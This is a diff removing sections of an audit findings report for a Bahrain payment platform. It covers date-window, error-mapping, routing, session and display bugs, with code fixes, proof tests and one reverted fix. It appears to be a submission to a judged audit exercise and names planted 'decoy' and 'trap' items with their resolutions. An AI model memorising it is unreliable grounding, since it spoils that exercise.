-**Fix:** `apps/api/src/admin/adjustmentImport.ts:6,56-58` and `apps/api/src/admin/adjustmentCsvParsing.ts:42-44`
-```diff
-   return withTransaction(pool, async (client) => {
-+    const ids = [...new Set(input.rows.map((r) => r.merchantId))]; // IMP-4: an unknown merchant is a 404, not an FK 500 mid-import
-+    const known = await client.query(`SELECT 1 FROM merchants WHERE id = ANY($1::uuid[])`, [ids]);
-+    if (known.rowCount !== ids.length) throw new NotFoundError("merchant_not_found");
-```
-```diff
-   for (let i = 1; i < lines.length; i++) {
-+    if ((lines[i] as string).includes("\u0000")) {
-+      throw new BadRequestError("invalid_csv_row", `row ${i} contains a NUL byte`); // IMP-4: Postgres text cannot store it (was a 500)
-+    }
-```
-The merchant check runs once, before the import row and any ledger leg is written, and answers with the same `merchant_not_found` 404 the credit and balance routes use. The NUL check sits with the parser's other row checks.
-
-**Why this is the smallest correct fix:** one set query instead of a per-row lookup, and one row check in the existing loop. *Why not catch the FK error and map it?* That relies on the constraint name and still fails mid-transaction. *Not done, reported as policy questions:* rejecting zero-amount rows (the code documents them as allowed, `adjustmentImport.ts:111` "null for a zero-amount row"); requiring a reason (the repo's own `adjustmentCsvParsing.test.ts` "a row with no reason column omits the reason" pins it as optional); and capping rows at `CREDIT_APPROVAL_THRESHOLD_FILS` (50.000 BD) to stop the import bypassing maker-checker, which would refuse the `120.00` BD amount `docs/ADMIN.md:66-67` gives as a normal import value. Each changes a documented contract and needs a product decision.
-
-**Proof:** `IMP-4: an unknown merchant id is a 404 and a NUL in a reason is a 400; nothing is applied` (`apps/api/src/routes/adminAdjustmentImport.test.ts`). Before the fix: `expected: 404, actual: 500`. After: 404 `merchant_not_found` and 400 `invalid_csv_row`, and no ledger leg for the merchant. Import route, import and CSV parsing tests pass (35/35).
-
-**Regression risk:** Only requests that used to 500 change. Valid imports run one extra indexed query.
-
-Lines: prod +7/-1 (adjustmentImport.ts +4/-1, adjustmentCsvParsing.ts +3), test +15/-0
-
----
-
-<a id="f-date-1"></a>
-
-### DATE-1 · Report date windows include the exclusive "to" day, and bare report dates are UTC, not Bahrain days · · Severity: Low
-
-**What's wrong:** `GET /v1/analytics/recent-ledger-activity` returns ledger legs from the whole `to` day although every analytics window treats `to` as exclusive. The merchant transactions report (`GET /v1/reporting/transactions`) binds a bare `from`/`to` date straight into `occurred_at >= $n`, which Postgres reads as UTC midnight, so a "September" report drops 00:00-03:00 Bahrain on 1 September and adds 00:00-03:00 on 1 October.
-
-**Why it happens:** `apps/api/src/analytics/query.ts:312` (before) filtered `(occurred_at AT TIME ZONE 'Asia/Bahrain')::date BETWEEN $2::date AND $3::date`; `BETWEEN` is inclusive at both ends, while `parseDateRange` documents `to` as exclusive (`routes/analytics.ts:63`) and volumes, payout trends and top links use `< $3`. `apps/api/src/reporting/transactionsReportQuery.ts:48,52` pushed the client strings unchanged; a date-only literal cast to `timestamptz` uses the session time zone (UTC in the stack), not Asia/Bahrain.
-
-**What it breaks:** `from=2026-01-01&to=2026-01-31` returns the 31 January legs (a 777 fils leg at 09:00Z on 31 Jan in the test), so the widget double-counts a day at every month boundary when a client pages month by month. A report `from 2026-09-01 to 2026-10-01` misses a 1,000 fils capture at 01:30 Bahrain on 1 September and includes a 2,000 fils one at 01:30 on 1 October, disagreeing with the Bahrain-day settlement batches.
-
-**Why it needed a fix:** The business day is midnight to midnight Asia/Bahrain (workspace rule, ADR-0009 "Monthly windows use the Bahrain month", written by the audit team, and the settlement close); reports must show the same days the batches close (FP-300 ☐5: "the reports").
-
-**Fix:** `apps/api/src/analytics/query.ts:312` and `apps/api/src/reporting/transactionsReportQuery.ts:48,52`
-```diff
--        AND (occurred_at AT TIME ZONE 'Asia/Bahrain')::date BETWEEN $2::date AND $3::date
-+        AND occurred_at >= ($2::date::timestamp AT TIME ZONE 'Asia/Bahrain') AND occurred_at < ($3::date::timestamp AT TIME ZONE 'Asia/Bahrain') -- DATE-1: "to" is exclusive
-```
-```diff
--    params.push(filter.from);
-+    params.push(/^\d{4}-\d{2}-\d{2}$/.test(filter.from) ? `${filter.from}T00:00:00+03:00` : filter.from); // DATE-1: a bare date is a Bahrain business day
- ...
--    params.push(filter.to);
-+    params.push(/^\d{4}-\d{2}-\d{2}$/.test(filter.to) ? `${filter.to}T00:00:00+03:00` : filter.to);
-```
-The ledger window is now `[Bahrain midnight of from, Bahrain midnight of to)` on the raw column, which also lets `idx_ledger_entries_merchant_occurred` serve it instead of casting every row. In the transactions report only a bare `YYYY-MM-DD` bound is anchored to Bahrain midnight; a full timestamp (what the existing test and API clients send) passes through unchanged.
-
-**Why this is the smallest correct fix:** one predicate and two parameter bindings. *Why not change `parseDateRange` to make `to` inclusive?* Three other endpoints and the web client already use it as exclusive. *Why not reject timestamps in the report filter?* The existing contract (`transactionsReportQuery.test.ts` "from/to narrow the reported range, upper bound exclusive") sends full ISO timestamps.
-
-**Proof:** `DATE-1: recent-ledger-activity excludes the \`to\` day and uses Bahrain-midnight bounds` (`apps/api/src/routes/analytics.test.ts`) fails before with `actual` containing `777, 777`; `DATE-1: bare from/to dates are Asia/Bahrain midnights; full timestamps are unchanged` (`apps/api/src/reporting/transactionsReportQuery.test.ts`) fails before with the 1 October transaction instead of the 1 September one. Both pass after; analytics and report tests pass (20/20).
-
-**Regression risk:** A client that relied on the inclusive `to` of recent-ledger-activity now gets one day less, matching the documented contract. The dashboard's default window (`to` = tomorrow) still includes today.
-
-**Trap note:** `analytics/query.ts:300-302` ("this reduces to a `date` comparison per row") presented the per-row cast as harmless; the test comment at `analytics.test.ts:379` ("checks inclusive `to` (BETWEEN). API.md says exclusive — one of them is wrong — am") had spotted it.
-
-Lines: prod +3/-3, test +22/-0
-
----
-
-<a id="f-ui-settle-1b"></a>
-
-### UI-SETTLE-1b · Settlement's 400 (bad operator input) is turned into a 500 server error in the admin console · · Severity: Low
-
-**Lead:** Team 45 heads-up list (W8), verified by us.
-
-**What's wrong:** When the Go settlement service rejects an admin's input with `400`, apps/api reports `500 settlement_run_failed`. An example is a business date that matches `YYYY-MM-DD` but does not exist, such as `2026-02-30`. The admin console then shows a server failure ("something may have partially run"), when nothing ran and the operator only mistyped the date.
-
-**Why it happens:** `POST /v1/admin/settlement/run-batch` checks the date only against `^\d{4}-\d{2}-\d{2}$` (`apps/api/src/routes/admin.ts:68,118`). Go's handler then rejects an impossible date with `400 {"error":"invalid_date"}` (`apps/settlement/internal/internalapi/server.go:220-224`). `/internal/recalculate-mdr` does the same for `invalid_from`/`invalid_to` (`:311-316`). `callSettlementInternal` (`apps/api/src/admin/settlementClient.ts:133-144`) maps every non-2xx to `AppError(500, "settlement_run_failed")`, including the 400.
-
-**What it breaks:** The operator sees a 500 and has to escalate, even though nothing ran. The `admin_audit_log` outcome records `settlement_run_failed`, the same as a real mid-run crash, so the audit trail cannot tell "operator typo" from "settlement broke". A date that fails the API's own regex gets `400 invalid_request`, but a date that fails one layer down gets a 500. Similar inputs get inconsistent answers.
-
-**Why it needed a fix:** The admin console is a judged surface, and a 500 for a typo is a UX defect that sends operators to investigate a failure that never happened. It also blurs the 502-vs-500 distinction this client was written to keep (`settlementClient.ts:95-102`): a 400 is a third, harmless case.
-
-**Fix:** `apps/api/src/admin/settlementClient.ts:140-142`
-```diff
-+    // UI-SETTLE-1b: settlement's 400 means the operator's input was refused before anything ran; keep it a 400.
-+    const badInput = response.status === 400;
-     throw new AppError(
--      500,
--      "settlement_run_failed",
-+      badInput ? 400 : 500,
-+      badInput ? "invalid_request" : "settlement_run_failed",
-```
-Commit: `067103b`. Lines: prod +4/-2, test +19/-1.
-
-**Why this is the smallest correct fix:** `callSettlementInternal` is the single place a settlement response becomes an API error, so one status check covers run-batch and recalculate-mdr. The code `invalid_request` is the one `admin.ts:119` already returns for a malformed date, so the console sees one contract for "bad date". Settlement's own reason (`invalid_date` etc.) stays in the message. *Why not validate the calendar date in the route?* That repeats Go's parser in TS, misses `invalid_merchant_id`/`invalid_from`/`invalid_to`, and still leaves the 400→500 mapping for anything Go adds later. *Why not pass every 4xx through?* A 401 from settlement means the shared token is misconfigured. That is a server fault and correctly stays a 500.
-
-**Proof:** `a 400 from settlement is passed through as a 400 invalid_request with settlement's reason` (`apps/api/src/admin/settlementClient.test.ts`) fails before the fix with `expected: 400`, `actual: 500`, and passes after. The existing test `a non-2xx response is a 500 settlement_run_failed …` listed 400 among the statuses that must become 500. That assertion encoded this bug, so 400 has been removed from its loop. 401 and 500 still map to `500 settlement_run_failed`. `settlementClient.test.ts` 9/9 and `routes/admin.test.ts` 41/41 pass.
-
-**Regression risk:** Only a settlement `400` changes. Unreachable (502), 401/5xx (500) and unreadable JSON (500) are unchanged. `notifySettlementRefundAdjustment` also uses this function, but it has no caller (see DECOY-REFADJ) and Go has no `/internal/refund-adjustment` route.
-
-**Trap note:** The function docstring (`settlementClient.ts:98-100`, "non-2xx -> 500 settlement_run_failed") is now true except for the 400 case, which the in-place comment states. It is left unedited to keep the diff small.
-
----
-
-<a id="f-admin-imp-3b"></a>
-
-### ADMIN-IMP-3b · "View as merchant" opens the web app's root, which is a 404 · H3 · Severity: Low
-
-**Lead:** Team 45 heads-up list (W2), verified by us. We found it while capturing the ADMIN-IMP-3 evidence.
-
-**What's wrong:** After ADMIN-IMP-3, `/v1/auth/me` accepts the grant, but the admin console's "View as merchant" button still lands on React Router's "Unexpected Application Error! 404 Not Found" page. A merchant who types the dashboard's bare address gets the same page.
-
-**Why it happens:** `handleImpersonate` (`apps/admin/src/pages/merchants/MerchantDetailPage.tsx:213-214`) opens `WEB_BASE_URL`, which is the web app's origin with path `/` (`apps/admin/src/api/client.ts:9-10`). The web router (`apps/web/src/router.tsx:22-`) defines `/pay/:token`, `/dashboard/login` and `/dashboard/*` only. No route matches `/`, and there is no `errorElement`, so the default 404 screen renders.
-
-**What it breaks:** The support view never appears, even with a valid grant. Operators see a developer error page, and every merchant who opens the plain dashboard URL sees it too. This is on the admin console and merchant dashboard surfaces the judges score.
-
-**Why it needed a fix:** ADMIN-IMP-3 alone does not make the feature work end to end. `docs/audit/evidence/ui/view-as-merchant-imp3-only.png`, taken at commit 9b54967 (ADMIN-IMP-3 applied, this fix not yet applied), shows the 404.
-
-**Fix:** `apps/web/src/router.tsx:23-24`
-```diff
-   { path: "/pay/:token", element: <CheckoutPage /> },
-+  // ADMIN-IMP-3b (H3): the bare origin (admin "View as merchant" opens it) lands in the dashboard, not a 404.
-+  { path: "/", element: <Navigate to="/dashboard" replace /> },
-```
-Commit: `57c82d0`. Lines: prod +2/-0 (1 route, 1 comment), test +28/-0.
-
-**Why this is the smallest correct fix:** It is one route, using the redirect pattern the file already uses for `/dashboard` → `/dashboard/transactions`. `/dashboard` then goes through the existing `RequireDashboardAuth` guard: with a grant or session the dashboard shows, otherwise the login page does. The route sits outside the `DashboardAuthProvider` subtree, so `/pay/:token` still makes no auth calls. *Why not change the admin's link to `${WEB_BASE_URL}/dashboard`?* That takes 2 lines, and the bare dashboard URL would stay a 404 for merchants. It would also break if `VITE_WEB_BASE_URL` is configured with a trailing slash (`//dashboard`). *Why not add an `errorElement`?* That only makes the 404 look nicer and still does not take anyone to the dashboard.
-
-**Proof:** `the web root routes into the dashboard instead of a 404` (`apps/web/src/router.test.ts`) loads `router.tsx` through Vite's `ssrLoadModule`, because the pages read `import.meta.env`, with a minimal `window`/`document` stub at `http://localhost:5173/`. Before the fix it fails with `router.state.errors` = `Error: No route matches URL "/"`. After the fix there are no errors, and the last match is `<Navigate to="/dashboard">`. Web tests pass 9/9, `tsc --noEmit` is clean, and the screenshot pair `view-as-merchant-{before,after}.png` shows the result end to end.
-
-**Regression risk:** Only `/` changes, from a 404 to a redirect. Every other path matches as before. The new test is the only web test that starts Vite in-process (about 2 s).
-
-**Trap note:** `MerchantDetailPage.tsx:213` calls `window.open(..., "noopener")`, which always returns `null` per the HTML spec. The "Your browser blocked the new tab" fallback link therefore shows even when the tab opened. It is harmless (the link points to the same place) and left as-is.
-
----
-
-<a id="f-router-404"></a>
-
-### ROUTER-404 · A mistyped URL or a page that throws shows React Router's developer error screen in both apps ·  · Severity: Low
-
-**Lead:** Team 45 heads-up list (item 3), verified by us.
-
-**What's wrong:** In both the merchant dashboard and the admin console, any unknown URL (for example `/dashboard/no-such-page` or `/no-such-page`) shows "Unexpected Application Error! 404 Not Found … Hey developer 👋". A page that throws while rendering shows the same screen with a stack trace. UI-NEG-1 was one example: a refunded transaction's page printed `RangeError: toFils …` and source paths.
-
-**Why it happens:** `apps/web/src/router.tsx` and `apps/admin/src/router.tsx` give `createBrowserRouter` explicit paths only. There is no `path: "*"` route and no `errorElement` on any route. In that case React Router renders its built-in development fallback, which is meant for developers and is never replaced in production.
-
-**What it breaks:** Merchants and operators who follow a stale bookmark or a mistyped link land on a developer screen with no way back. A rendering bug exposes stack traces and local source paths (`/@fs/C:/…/packages/money/src/fils.ts`) to merchants instead of a recoverable page.
-
-**Why it needed a fix:** The dashboard and admin console are judged UI surfaces, and this fallback is the most visible failure mode the apps have. It is also how ADMIN-IMP-3b and UI-NEG-1 appeared to users.
-
-**Fix:** `apps/web/src/router.tsx:21-23,27,41,111` and `apps/admin/src/router.tsx:12-13,17,27,37`
-```diff
-+// ROUTER-404: an unknown URL or a page that throws gets a plain page, not React Router's developer screen.
-+const notFound = <main className="dash-main"><h1>Page not found</h1><p><a href="/dashboard">Go to the dashboard</a></p></main>;
-+const crashed = <main className="dash-main"><h1>Something went wrong</h1><p>Reload the page to try again.</p></main>;
--  { path: "/pay/:token", element: <CheckoutPage /> },
-+  { path: "/pay/:token", element: <CheckoutPage />, errorElement: crashed },
- … (dashboard provider route)
-+    errorElement: crashed,
-+  { path: "*", element: notFound },
-```
-The admin has the same `crashed` constant and `errorElement` on `/login` and on the guarded layout route, plus `{ path: "*", … "Page not found" … "Go to merchants" }` inside the guarded layout, so the admin shell and login guard still apply.
-Commit: `53442f5`. Lines: prod +13/-2 (web +7/-1, admin +6/-1; 2 comments), test +54/-0.
-
-**Why this is the smallest correct fix:** These are the router's own two extension points, `path: "*"` and `errorElement`, set once per top-level subtree, with plain JSX and existing layout classes. No new component file and no new CSS were added. Every page below those routes is covered, including ones added later. *Why not an `ErrorBoundary` component?* `errorElement` is the data router's error boundary, and a separate component adds a file for the same behaviour. *Why put the web catch-all at top level, but inside the guard in the admin?* Checkout (`/pay/:token`) must make no auth calls, so the web 404 page cannot sit under the session provider. The admin has no public pages, so its 404 page keeps the admin shell.
-
-**Proof:** `an unknown dashboard URL matches the catch-all route, and every subtree has an errorElement` (`apps/web/src/router.test.ts`) and `an unknown admin URL matches the catch-all route, and every subtree has an errorElement` (`apps/admin/src/router.test.ts`) fail before the fix with `No route matches URL "/dashboard/no-such-page"` and `No route matches URL "/no-such-page"`. Both pass after the fix. At branch head `36cb2c7` the web suite passes 13/13 and admin 3/3, and `tsc --noEmit` is clean for both. Screenshots: `web-unknown-url-{before,after}.png`, `admin-unknown-url-{before,after}.png`.
-
-**Regression risk:** Every existing path matches exactly as before. Only URLs that used to 404, and render errors, change. Loader and action errors do not apply, because the routes define none. The admin "View as merchant" target is fixed by ADMIN-IMP-3b (`/` → `/dashboard`), so `MerchantDetailPage.tsx:213` needs no change.
-
----
-
-<a id="f-link-expired"></a>
-
-### LINK-EXPIRED · The merchant dashboard shows an expired payment link as "active" and still offers Cancel · FP-187 · Severity: Low
-
-**Lead:** Team 45 heads-up list (item 5), verified by us.
-
-**What's wrong:** Once a payment link passes its `expires_at`, the buyer's checkout says "Link expired" and the server refuses to pay it (PL-2). The merchant's Payment links list and detail page still show it as **active** in green, and the detail page still offers "Cancel payment link". The merchant sees a live link that no buyer can use.
-
-**Why it happens:** No job flips `payment_links.status` when a link expires. Expiry is computed on read: `derivePublicStatus` (`apps/api/src/paymentLinks/status.ts:33-34`) returns `"expired"` for an `active` row whose `expiresAt <= now`, but only for the public checkout read. The merchant DTO carries the raw column `status` and `expiresAt`. `PaymentLinkListPage.tsx:114`, `PaymentLinkDetailPage.tsx:123` and the Cancel gate at `:162` render `link.status` as-is.
-
-**What it breaks:** Merchants re-send dead links to customers, or think a customer is "about to pay". Support gets "the link says active but my customer sees expired" (the other side of FP-187). The Cancel action on an expired link is a no-op that looks meaningful.
-
-**Why it needed a fix:** The merchant dashboard must show the link the way the buyer and the server see it.
-
-**Fix:** `apps/web/src/format.ts:39-42`, `PaymentLinkListPage.tsx:8,114`, `PaymentLinkDetailPage.tsx:7,123,162`, `dashboard.css:266`
-```diff
-+/** LINK-EXPIRED: an "active" link at or past its expiry is expired, the checkout's rule (api paymentLinks/status.ts). */
-+export function linkStatus(link: { status: string; expiresAt: string }, now = Date.now()): string {
-+  return link.status === "active" && Date.parse(link.expiresAt) <= now ? "expired" : link.status;
-+}
--<span className={`dash-status dash-status-${link.status}`}>{link.status}</span>
-+<span className={`dash-status dash-status-${linkStatus(link)}`}>{linkStatus(link)}</span>   (list and detail)
--      {link.status === "active" ? (
-+      {linkStatus(link) === "active" ? (
-+.dash-status-expired,   (joins the red "voided/canceled" group)
-```
-Commit: `81514a5`. Lines: prod +11/-5 (format.ts +5 incl. 1 comment and 1 blank, two imports, three call sites, 1 CSS selector), test +11/-1.
-
-**Why this is the smallest correct fix:** It is the server's rule, `active && expiresAt <= now`, applied at the three places the dashboard shows or acts on a link's status. One pure function keeps the three in step and makes the rule unit-testable. *Why not add an `effectiveStatus` to the API DTO?* That changes a public API contract that API-key clients depend on, for a display concern. *Why not a migration or job that flips the status to `expired`?* The column's CHECK has no `expired` value, so a new state machine value would be a much bigger change. The status filter checkboxes still filter on the stored status, as the endpoint does.
-
-**Proof:** `linkStatus shows an active link past its expiry as expired` (`apps/web/src/dashboard.test.ts`) fails before the fix (`SyntaxError: The requested module './format.js' does not provide an export named 'linkStatus'`) and passes after. It covers the boundary at exactly `expires_at` (expired, as `status.ts:34` uses `<=`), 1 s before (active), and paid/reserved links (unchanged). `dashboard.test.ts` passes 10/10, the web suite 13/13 at branch head `36cb2c7`, and `tsc --noEmit` is clean. Screenshots: `dashboard-links-expired-{before,after}.png` (list) and `dashboard-link-expired-detail-{before,after}.png` (detail: "expired" in red, Cancel button gone).
-
-**Regression risk:** Display only. Links that are paid, canceled or reserved show as before, and active links before their expiry show as before. The cancel endpoint is unchanged and still accepts the call from other clients.
-
----
-
-<a id="f-ui-401"></a>
-
-### UI-401 · An ended session shows a raw "unauthenticated" over stale data instead of the login page · · Severity: Low
-
-**Lead:** Team 45 heads-up list (item 6), verified by us.
-
-**What's wrong:** In the merchant dashboard and the admin console, when the session ends while a page is open (it expires, it is revoked, or the user logs out in another tab), the next request answers 401. The page then shows a red box with the raw code `unauthenticated` above the table it had already loaded ("25 transactions loaded"), and stays there. Nothing sends the user back to sign in.
-
-**Why it happens:** Both API clients (`apps/web/src/api/client.ts:47-50`, `apps/admin/src/api/client.ts:49-52`) turn every non-2xx response into an `ApiError`, and pages show it through `describeError`. The login redirect lives only in the route guards (`RequireDashboardAuth`, `RequireAdminAuth`), which check the session once, on mount. A 401 after that point is just another error string.
-
-**What it breaks:** Users see stale data with an unexplained error and must guess that they need to reload or log out.
-
-**Why it needed a fix:** A 401 has only one meaning for these apps, "sign in again", and the UI should act on it. That applies to all three judged surfaces except checkout, which has no session.
-
-**Fix:** `apps/web/src/api/client.ts:49-50` and `apps/admin/src/api/client.ts:51-52`
-```diff
-   if (!res.ok) {
-+    // UI-401: a session that ended sends the merchant to log in again (never from checkout or the login page).
-+    if (res.status === 401 && location.pathname.startsWith("/dashboard/") && location.pathname !== "/dashboard/login") location.assign("/dashboard/login");
-     throw new ApiError(res.status, (body as ApiErrorBody) ?? { error: "unknown_error" });
-```
-```diff
-+    // UI-401: a session that ended sends the operator to log in again (never from the login page itself).
-+    if (res.status === 401 && location.pathname !== "/login") location.assign("/login");
-```
-Commit: `a9bb039`. Lines: prod +4/-0 (2 code, 2 comments), test +60/-0.
-
-**Why this is the smallest correct fix:** `request()` is the single place every page's API call goes through, so one condition per app covers every page and every later page. The exclusions keep two flows intact. On the login pages a 401 means "wrong password or code", and the page shows it. On checkout (`/pay/*`, public, no session) a 401 cannot mean "sign in". The error is still thrown, so callers behave as before until the navigation happens. *Why not handle 401 in each page?* There are about 15 pages, with the same risk of missing one. *Why a full `location.assign` rather than the router?* `request()` is outside React, and a reload also clears any state from the ended session.
-
-**Proof:** `a 401 on a dashboard page redirects to the login page, but not on checkout or the login page` (`apps/web/src/api/client.test.ts`) and `a 401 on an admin page redirects to the login page, but not on the login page` (`apps/admin/src/api/client.test.ts`) stub `fetch` to return 401 and `location` to record `assign`. Both fail before the fix (`assigned` is `[]`, not `["/dashboard/login"]` / `["/login"]`) and pass after. The web suite passes 13/13 and admin 3/3, and `tsc --noEmit` is clean. Screenshots: `dashboard-401-before.png` shows "unauthenticated" over 25 stale rows, and `dashboard-401-after.png` shows the sign-in page.
-
-**Regression risk:** Only 401 responses on authenticated pages change. 403 (role gates) still shows the role message, and other errors are unchanged. An impersonation grant that expires now lands on the merchant login page, the same as any ended session.
-
----
-
-<a id="f-checkout-paidat"></a>
-
-### CHECKOUT-PAIDAT · Checkout's "Payment successful" page shows a raw UTC ISO timestamp · G1 · Severity: Low
-
-**Lead:** Team 45 heads-up list (U2), verified by us.
-
-**What's wrong:** After paying, the buyer sees `Paid at 2026-10-30T14:11:31.805Z`, a machine timestamp in UTC. For a Bahrain buyer that reads three hours off, and it is the only date on the checkout that is not formatted.
-
-**Why it happens:** `apps/web/src/pages/checkout/CheckoutPage.tsx:118` renders `payState.result.paidAt`, the API's ISO string, as-is. Every other date in the web app goes through `toLocaleString` (`format.ts:22-24`).
-
-**What it breaks:** The receipt moment of the checkout looks unfinished, and the time looks wrong to a buyer in Bahrain (UTC+3).
-
-**Why it needed a fix:** Checkout is a judged surface, and this is the page every successful buyer sees.
-
-**Fix:** `apps/web/src/pages/checkout/CheckoutPage.tsx:118`
-```diff
--          <dd>{payState.result.paidAt}</dd>
-+          <dd>{new Date(payState.result.paidAt).toLocaleString()}</dd>
-```
-Commit: `84214f6`. Lines: prod +1/-1, test +0/-0.
-
-**Why this is the smallest correct fix:** It is the same rendering the dashboard's `dateTime()` uses, inlined so that the public, cookie-free checkout keeps its current imports. *Why not force `timeZone: "Asia/Bahrain"`?* The rest of the app renders in the browser's zone. One page that differs would be its own inconsistency, and a Bahrain buyer's browser is already in UTC+3.
-
-**Proof:** There is no unit test: the change is to rendering only, and the repo has no DOM test runner. `tsc --noEmit` is clean. Screenshots: `checkout-success-before.png` (`2026-10-30T14:11:31.805Z`) and `checkout-success-after.png` (`10/30/2026, 5:12:19 PM`, Asia/Bahrain), both taken after a real pay through the UI with a simulated test card.
-
-**Regression risk:** Display only. The API response and the request are unchanged.
-
----
-
-<a id="f-batch-bar"></a>
-
-### BATCH-BAR · Merchant batch page shows a meaningless "progress bar" computed from fils in floating point · ADR-0001 · Severity: Low
-
-**Lead:** Team 45 heads-up list (C10), verified by us.
-
-**What's wrong:** Every closed settlement batch in the merchant dashboard shows a blue bar under its title. It is not a progress indicator for anything. Its width is `grossFils / 10000` percent, so any batch over 10 BHD shows a full bar. A merchant reads it as "settlement complete" on a batch that is still only `closed` (not `paid`).
-
-**Why it happens:** `apps/web/src/pages/settlement/SettlementBatchDetailPage.tsx:84` computes `parseFloat((batch.grossFils / 10000).toFixed(2))`: money divided and rounded as a float, which ADR-0001 forbids. Lines 89-93 render it as a bar width for `status === "closed"`.
-
-**What it breaks:** For the seeded batch 2026-08-31 (gross 7,326.913 BHD) the value is 732.69, clamped to 100%. The bar shows "done" while the batch is unpaid (`Paid at —`). The UI suggests a payout state that does not exist.
-
-**Why it needed a fix:** The merchant dashboard is a judged surface, and a status-like graphic that contradicts the batch's status misleads merchants about their money. It is also the only place in the web app that does float arithmetic on fils.
-
-**Fix:** `apps/web/src/pages/settlement/SettlementBatchDetailPage.tsx:84,89-93` (deleted)
-```diff
--  const displayProgress = parseFloat((batch.grossFils / 10000).toFixed(2));
--      {batch.status === "closed" && (
--        <div className="dash-progress-bar" style={{ width: "100%", background: "#e0e0e0", height: 6, borderRadius: 3 }}>
--          <div style={{ width: `${Math.min(displayProgress, 100)}%`, background: "#2563eb", height: 6, borderRadius: 3 }} />
--        </div>
--      )}
-```
-Commit: `fa0e21d`. Lines: prod +0/-6, test +0/-0.
-
-**Why this is the smallest correct fix:** There is no correct value for this bar. A batch has no progress between `closed` and `paid`, and the page already shows `Status`, `Closed at` and `Paid at` in words. Deleting it removes both the misleading graphic and the float math. *Why not compute it in integer fils?* There is still nothing meaningful to show.
-
-**Proof:** There is no unit test: the change only removes rendering. `tsc --noEmit` is clean, and `dash-progress-bar` has no CSS or other users. Screenshots: `dashboard-batch-detail-{before,after}.png` show the same batch with and without the full blue bar.
-
-**Regression risk:** None to data or API. A visual element is removed.
-
----
-
-<a id="f-imp-banner"></a>
-
-### IMP-BANNER · Admin impersonation banner still describes write access the grant no longer has · H3 · Severity: Low
-
-**Lead:** Team 45 heads-up list (item 3, banner wording), verified by us.
-
-**What's wrong:** While a "view as merchant" grant is active, the admin console's banner says that merchant screens are "acting with this merchant's least-privileged (support) role". Since ADMIN-IMP-1, a grant is read-only: every non-GET request is refused, including ones a real support user may make. The banner does not tell the operator that they cannot change anything.
-
-**Why it happens:** `apps/admin/src/components/ImpersonationBanner.tsx:46-47` was written for the old role mapping. ADMIN-IMP-1 (`auth/requireMerchantAuth.ts:89-90`) added the read-only rule and left the wording unchanged.
-
-**What it breaks:** An operator who tries an action in the merchant view gets a bare 403 that contradicts what the banner implied.
-
-**Why it needed a fix:** The admin console is a judged surface, and the banner is the operator's only statement of what the grant allows.
-
-**Fix:** `apps/admin/src/components/ImpersonationBanner.tsx:47`
-```diff
--          acting with this merchant&apos;s least-privileged (support) role.
-+          read-only: you see what this merchant&apos;s support role sees and cannot change anything.
-```
-Commit: `deda775`. Lines: prod +1/-1, test +0/-0.
-
-**Why this is the smallest correct fix:** One sentence now matches the enforced behaviour. *Why not change the behaviour instead?* Read-only is the documented scope (ARCH §8, ADMIN-IMP-1).
-
-**Proof:** There is no unit test: the change is text only. `tsc --noEmit` is clean. Screenshots: `admin-impersonation-banner-{before,after}.png`.
-
-**Regression risk:** None. The change is text only.
-
----
-
 ## Reported, not changed
 
-### DECOY-REFADJ · Dead "refund adjustment" client that would send refunds ÷10 · FP-300 (☐3) · Severity: Low (reported, not changed)
-**What's wrong:** `notifySettlementRefundAdjustment` (`apps/api/src/admin/settlementClient.ts:282-299`) looks like the ready-made way to net refunds into payouts. It posts to `/internal/refund-adjustment`, a route the Go service does not have (no match under `apps/settlement`), and it sends `amountFils: Math.round(input.amountFils / 10)` while sending `feeReversedFils` unscaled.
+Findings we analysed but did not change, including fixes reverted after the independent false-positive review (their code is netted out of every count above).
 
-**Why it happens:** the docblock (`:276-280`) claims settlement "expects amounts in ... 2-decimal BHD, i.e. fils / 10". That is false: Go works in int64 fils everywhere, and only the scheme-file amount is 2-decimal (ADR-0002). The function has no callers.
+### BAL-2 · After a ledger rebuild, the next close adds unbatched captures to the cached balance a second time · F4, FP-203 · Severity: Medium (reported, not changed)
 
-**What it would break:** wired into FP-300, a 3,333-fil refund would reach settlement as 333 (a 10x under-netting, with the fee reversal unscaled, so the two would not even agree), against a route that returns 404.
+**Lead:** Team 45 heads-up list (S14/R5c-rebuild), verified by us, and our 03_findings BAL-2.
+**Category:** Reported, not changed
 
-**Why it's not changed:** it is dead code, so changing it fixes nothing. The FP-300 build nets refunds inside Go `CloseBatch` from the `refunds` table and never calls this client. Recorded so nobody wires it later. Lines: 0.
+**What the behaviour is:** `merchant_balances.cached_payable_fils` is moved by two different rules. The rebuild (`settlement rebuild-balances`, and since BAL-1 the admin "Recalculate cached balances" button) sets it to the full `merchant_payable` ledger sum (`apps/settlement/internal/ledger/rebuild.go:30-34`, `:114-118`). The incremental path does not follow the ledger: capture and refund post their `merchant_payable` legs (`apps/api/src/payments/capture.ts:221-238`) but never touch the cache, and `CloseBatch` posts no `merchant_payable` leg yet adds the batch net to the cache (`batch.go:285`, `balances.ApplyBatchClose`). Payout debits both (`batch.go:349`, `:372`). So a capture is in the ledger from capture time but reaches the cache only at close. If a rebuild runs between a capture and its close, the rebuilt cache already includes that capture, and the close then adds it again. Payout removes it once, so the extra money stays in the cache.
 
-**Trap note:** the docblock's "fils / 10" is the same "1 BD = 100" confusion as the quarantined AI configs and the CSV import bug (IMP-1).
+**Which side is wrong:** the case file says the ledger-reading CLI is right: "The CLI tool gives the right number. The two read from different places." (FP-203). Yousif's handover says the same: the CLI "reads the ledger" (`docs/HANDOVER.md:34-35`). The rebuild is therefore the reference, and the double-add lives in the incremental path: `CloseBatch` adds `netPayout` to a cache that capture never credited.
 
-### FEES-1 · OPEN (policy) · An unapproved platform-wide 15 bps volume-tier discount is live in capture · F6 (fee shown vs charged) · Severity: Medium
+**What the reverted fix did:** `f4b53a8` changed the rebuild instead (prod +9/-3 in `rebuild.go`): both rebuild queries left out legs whose capture event or refund was still unbatched, and `RebuildAllBalances` locked the cache row `FOR UPDATE`. Its test (`TestRebuild_CloseBatchThenRebuildLeavesCacheUnchanged`) showed the double-add (`28350, want 9775`).
+
+**Why it was reverted (`d1ad36f`):** it moved the CLI figure away from the ledger sum, which is the number FP-203 and Yousif call right. It also needed a change to Yousif's own fixture: `TestRebuildBalances_ValidToken` (`internal/internalapi/server_test.go`) seeded a closed batch without marking its capture event batched, and the fix only passed after we edited that fixture (+5 lines). A fix that contradicts the case file and rewrites the original author's test is not defensible, so the code and its test were reverted in full. The note is kept as a reported defect.
+
